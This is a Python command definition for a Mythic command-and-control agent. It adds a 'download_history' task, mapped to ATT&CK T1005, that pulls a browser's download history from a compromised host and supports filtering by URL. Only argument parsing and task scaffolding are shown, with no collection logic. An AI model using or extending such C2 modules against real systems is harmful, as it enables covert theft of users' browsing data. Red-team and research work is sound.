from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class DownloadHistoryArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="limit",
                type=ParameterType.Number,
                description="Maximum number of download records to return",
                default_value=200,
            ),
            CommandParameter(
                name="url_filter",
                type=ParameterType.String,
                description="Optional substring to filter download URLs",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            self.load_args_from_json_string(self.command_line)


class DownloadHistoryCommand(CommandBase):
    cmd            = "download_history"
    needs_admin    = False
    help_cmd       = "download_history"
    description    = (
        "Retrieve the browser's download history. Returns plain text for ≤100 entries, "
        "or a downloadable file for larger results."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = DownloadHistoryArguments
    parameters     = []
    attackmapping  = ["T1005"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        limit      = task.args.get_arg("limit")
        url_filter = task.args.get_arg("url_filter")
        task.display_params = f"limit={limit}" + (f" filter={url_filter}" if url_filter else "")
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
